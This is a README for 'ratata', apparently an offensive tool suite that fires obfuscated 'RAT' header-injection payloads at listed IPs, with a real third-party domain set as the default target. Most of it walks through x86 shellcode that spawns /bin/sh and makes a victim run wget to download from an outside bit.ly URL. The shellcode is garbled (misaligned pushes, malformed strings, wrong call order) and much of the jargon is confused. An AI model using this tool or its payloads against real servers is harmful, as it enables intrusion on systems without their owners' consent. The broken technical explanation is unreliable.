# ratata
UEFI-encoded RAT attack tester suite for headers injections on servers.

Ratata takes in an IP, an IPv4, which you can modify in the list in the python file, and attacks it with obsfuscated RAT payloads.. these payloads are obsfuscated in different ways in each version, v1.0 and v2.0 using a UEFI encoder and v3.0 using a polyglot encoder. Right now the file targets the evil master of all servers on chuckecheese.com. You can add as many as you want but when you run the script it asks how many iterations you want.. default is 100, which is a lot (set at 2 is recommended..).. these iterations test RAT debug payloads that are in the code.

ratata_v2 (the version 2.0) is what you want . the first iteration it does is a standard, well-tested well-battled polyglot that works on a lot of stuff...
i call it the ratata polyglot and it's now available in ratata 2.0.

ratata_v3 is even better though.. it uses a recursive ai to add to the ratata polyglot in 2.0. each iteration builds upon the ratata polyglot to achieve an execution.

ratata 1.0 is pure UEFI rando algo stuff.. try to get something new. ratata injects on headers.

to install do:

git clone https://github.com/aamazie/ratata/

to run do:

cd ratata

python ratata_v2.py


ALSO included a UEFI injection debug scanner. Injects a NOP sled + overflow + INT3 trap (for debug). Shows up if the maxheaders go above 256-bit and cause a header buffer overflow.

Raticate is the utilmate utility in finding UEFI overflows.. it parses through many shellcode payloads and injects a RAT debug. It hacks everything with a NOP Sled Overflow.

Pikachu is some kind of another bug ai scanner that's like a combination of raticate v2.0 and ratata v3.0 to find RAT injections. Asks for iteration count and you can put multiple IPs into the list in the python.

Raichu is an update to the extremely verbose and effective Raticate_V2 that should work for more domains.



Pigeon.py has a different shellcode execution to Raticate_V2.. it shows a wget payload is possbile to execute through a buffer overflow:

1. Push /bin/sh onto the stack:
The shellcode first prepares the /bin/sh command so that when execve is called, it can invoke the shell. This is important because we need a shell environment to execute wget.

python
Copy code
b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"  # Push "/bin//sh" to stack
b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"              # Execve syscall to spawn a shell
Explanation:
31 c0: XOR the EAX register with itself (sets EAX to 0).
50: Push EAX (null terminator for the string).
68 2f 2f 73 68: Push the string "//sh" to the stack (part of /bin/sh).
68 2f 62 69 6e: Push the string "/bin" to the stack.
89 e3: Move the pointer to the top of the stack (/bin/sh) into the EBX register.
The next instructions set up execve with /bin/sh.
Now, the shell environment is set up and ready to run commands, but before execve is called, we need to push the arguments for the command we want to run.

2. Push the wget command and URL onto the stack in reverse:
To run wget, we push the command and the URL in reverse order (due to how the stack works — it pushes bytes in a last-in-first-out manner). The URL will be broken into parts and pushed one after the other.

For example, if we want to call wget https://bit.ly/3xyzabc, the URL and command need to be pushed in chunks, starting from the end and working backwards.

Here’s how we can push https://bit.ly/3xyzabc:

python
Copy code
# Push the URL "https://bit.ly/3xyzabc" in reverse
b"\x68\x7a\x61\x62\x63"                      # Push "zabc" (last part of URL)
b"\x68\x33\x78\x79\x7a"                      # Push "3xyz"
b"\x68\x2e\x6c\x79\x2f"                      # Push ".ly/"
b"\x68\x62\x69\x74\x2f"                      # Push "bit/"
b"\x68\x73\x3a\x2f\x2f"                      # Push "://"
b"\x68\x73\x68\x74\x74"                      # Push "shtt" (first part of "https")
Explanation:
68 <hex values>: This is the instruction to push a 4-byte value onto the stack.
Each chunk of the URL is pushed in reverse because the stack works by pushing items last-in-first-out (LIFO). When execve runs, it will read the stack from bottom to top, giving us the correct URL.
3. Push the wget command:
Now that the URL is on the stack, we need to push the command wget that we want to execute.

python
Copy code
b"\x68\x2f\x77\x67\x65"                      # Push "wget" command
Explanation:
We push the string "wget" onto the stack so that when /bin/sh runs, it knows to run wget with the URL as its argument.
4. Call execve to execute /bin/sh:
After everything is pushed onto the stack, we call execve, which will spawn a shell and execute wget with the URL as its argument.

python
Copy code
b"\x50\x53\x89\xe1\xb0\x0b\xcd\x80"          # Execve syscall to execute the command
Explanation:
50: Push the EAX register (null terminator).
53: Push the EBX register (which contains the address of the command).
89 e1: Move the pointer to the stack into the ECX register (for execve).
b0 0b: Load 11 (the execve syscall number) into EAX.
cd 80: Trigger an interrupt to make the system call.
Complete Shellcode:
Here’s the full shellcode that will execute wget https://bit.ly/3xyzabc:

python
Copy code
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"  # Push "/bin//sh" to stack
    b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"              # Execve syscall to spawn a shell

    # Push the URL "https://bit.ly/3xyzabc" in reverse
    b"\x68\x7a\x61\x62\x63"                      # Push "zabc" (last part of URL)
    b"\x68\x33\x78\x79\x7a"                      # Push "3xyz"
    b"\x68\x2e\x6c\x79\x2f"                      # Push ".ly/"
    b"\x68\x62\x69\x74\x2f"                      # Push "bit/"
    b"\x68\x73\x3a\x2f\x2f"                      # Push "://"
    b"\x68\x73\x68\x74\x74"                      # Push "shtt" (first part of "https")

    # Push "wget" command
    b"\x68\x2f\x77\x67\x65"                      # Push "wget" command

    # Call execve to execute wget https://bit.ly/3xyzabc
    b"\x50\x53\x89\xe1\xb0\x0b\xcd\x80"          # Execve syscall to execute the command
)
Execution Flow:
Set up /bin/sh: We prepare the shell environment.
Push wget https://bit.ly/3xyzabc: The URL is pushed in reverse order onto the stack.
Execute wget: execve is called, spawning /bin/sh and running wget with the URL.
This allows the target system to execute the wget command to download a file from https://bit.ly/3xyzabc.

DISCLAIMER: the developers claim no responsibility or liability for the public misuse of this debugger, their property.
